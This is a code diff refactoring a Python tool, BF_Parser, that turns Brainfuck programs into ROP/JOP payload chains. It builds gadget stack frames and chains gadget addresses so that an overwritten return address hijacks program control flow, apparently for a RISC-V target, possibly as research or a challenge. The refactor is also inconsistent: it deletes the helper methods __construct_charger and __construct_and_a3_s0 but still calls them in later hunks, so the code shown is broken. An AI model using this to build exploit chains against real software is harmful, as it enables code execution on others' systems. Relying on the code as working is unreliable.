@@ -1,5 +1,18 @@
-from ast import Store
-from gadgets import *
+from bf_parser.jop_gadgets.increment_a3 import *
+from bf_parser.jop_gadgets.increment_s0 import *
+from bf_parser.jop_gadgets.initialize_a2 import *
+from bf_parser.jop_gadgets.initialize_a3 import *
+from bf_parser.jop_gadgets.initialize_a3_a7 import *
+from bf_parser.jop_gadgets.store_s0 import *
+from bf_parser.jop_gadgets.load_s0 import *
+from bf_parser.jop_gadgets.li_a1_0 import *
+from bf_parser.jop_gadgets.mov_s0_a0 import *
+
+from bf_parser.rop_gadgets.copy_a3 import *
+from bf_parser.rop_gadgets.restore_a3 import *
+from bf_parser.rop_gadgets.mov_a0_s0 import *
+from bf_parser.rop_gadgets.and_a3_s0 import *
+from bf_parser.rop_gadgets.charger import *
 
 class BF_Parser():
     def __init__(self, bf_code):
@@ -19,58 +32,23 @@ class BF_Parser():
         self.__inc_s0     = IncrementS0()
         self.__store_s0   = StoreS0()
         self.__mov_s0_a0  = MovS0_A0()
-
-    def __construct_charger(self, ra=0, \
-                                  s0=0, \
-                                  s1=0, \
-                                  s2=0, \
-                                  s3=0, \
-                                  s4=0, \
-                                  s5=0, \
-                                  s6=0, \
-                                  s7=0, \
-                                  s8=0, \
-                                  s9=0, \
-                                  s10=0, \
-                                  s11=0 \
-                            ):
-
-        offset = [0]
-        data = [s11, s10, s9, s8, s7, s6, s5, s4, s3, s2, s1, s0, ra]
-        self.__charger.set_stack_frame(offset + data)
-
-    def __construct_copy_a3(self, ra=0, s0=0):
-        data = [s0, ra]
-        self.__copy_a3.set_stack_frame(data)
-
-    def __construct_restore_a3(self, ra=0, s0=0, s1=0, s2=0):
-        data = [s2, s1, s0, ra]
-        self.__restore_a3.set_stack_frame(data)
-
-    def __construct_mov_a0_s0(self, ra=0, s0=0, s1=0, s2=0, s3=0, s4=0, s5=0, s6=0):
-        data = [s6, s5, s4, s3, s2, s1, s0, ra]
-        self.__mov_a0_s0.set_stack_frame(data)
-
-    def __construct_and_a3_s0(self, ra=0, s0=0, s1=0):
-        data = [0, s1, s0, ra]
-        self.__and_a3_s0.set_stack_frame(data)
+        self.__li_a1_0    = LiA1_0()
 
     def get_payload_len(self):
         # return the number of bytes of the generated rop chain
-        charger_frame_sz = 112
-        write_mem_frame_sz = 16
-        read_mem_frame_sz = 32
-        mov_a0_s0_frame_sz = 64
-        and_a3_s0_frame_sz = 32
 
-        total_len = 8 + charger_frame_sz # for the initialization
+        total_len = 8 + self.__charger.get_frame_size() # for the initialization
 
         for instruction in self.__bf_code:
             if instruction == '>' or instruction == '<':
-                total_len += charger_frame_sz
+                total_len +=  self.__charger.get_frame_size()
 
             elif instruction == '+' or instruction == '-':
-                total_len += 4 * charger_frame_sz + write_mem_frame_sz + read_mem_frame_sz + mov_a0_s0_frame_sz + and_a3_s0_frame_sz
+                total_len += 4 *  self.__charger.get_frame_size() + \
+                             self.__copy_a3.get_frame_size() + \
+                             self.__restore_a3.get_frame_size() + \
+                             self.__mov_a0_s0.get_frame_size() + \
+                             self.__and_a3_s0.get_frame_size()
 
             elif instruction == '.':
                 pass
@@ -88,7 +66,7 @@ class BF_Parser():
 
     def parse(self, pointer_start, backup_addr):
         # initialize a3 to point to the middle of the tape
-        self.__construct_charger(ra=self.__init_a3.get_vaddr(), s4=self.__charger.get_vaddr(), s7=pointer_start)
+        self.__charger.construct_frame(ra=self.__init_a3.get_vaddr(), s4=self.__charger.get_vaddr(), s7=pointer_start)
 
         rop_chain = self.__charger.print_vaddr() # charger address that overrides $ra
         rop_chain += self.__charger.print_gadget() # charger frame
@@ -97,10 +75,10 @@ class BF_Parser():
             if instruction == '>' or instruction == '<':
                 increment = 0x8 if instruction == '>' else -0x8
 
-                self.__construct_charger(ra=self.__inc_a3.get_vaddr(), \
-                                         s1=increment, \
-                                         s4=self.__charger.get_vaddr() \
-                                        )
+                self.__charger.construct_frame(ra=self.__inc_a3.get_vaddr(), \
+                                               s1=increment, \
+                                               s4=self.__charger.get_vaddr() \
+                                              )
                 rop_chain += self.__charger.print_gadget()
 
             elif instruction == '+' or instruction == '-':
@@ -136,13 +114,20 @@ class BF_Parser():
                                             )
                 rop_chain += self.__restore_a3.print_gadget()
 
-                self.__construct_and_a3_s0(ra=self.__mov_s0_a0.get_vaddr())
+                self.__construct_and_a3_s0(ra=self.__charger.get_vaddr())
                 rop_chain += self.__and_a3_s0.print_gadget()
 
-                self.__construct_charger(ra=self.__inc_a3.get_vaddr(), \
+                self.__construct_charger(ra=self.__mov_s0_a0.get_vaddr(), \
                                          s1=-0x28, \
-                                         s3=0, \
-                                         s4=self.__store_s0.get_vaddr(), \
+                                         s2=1, \
+                                         s3=1, \
+                                         s4=self.__charger.get_vaddr(), \
+                                         s7=self.__inc_a3.get_vaddr(), \
+                                        )
+                rop_chain += self.__charger.print_gadget()
+
+                self.__construct_charger(ra=self.__li_a1_0.get_vaddr(), \
+                                         s1=self.__store_s0.get_vaddr(), \
                                          s8=self.__charger.get_vaddr() - 0x6d6
                                         )
                 rop_chain += self.__charger.print_gadget()
@@ -151,7 +136,6 @@ class BF_Parser():
                                          s1=0x28, \
                                          s4=self.__charger.get_vaddr()
                                         )
-                rop_chain += self.__charger.print_gadget()
 
             elif instruction == '.':
                 pass
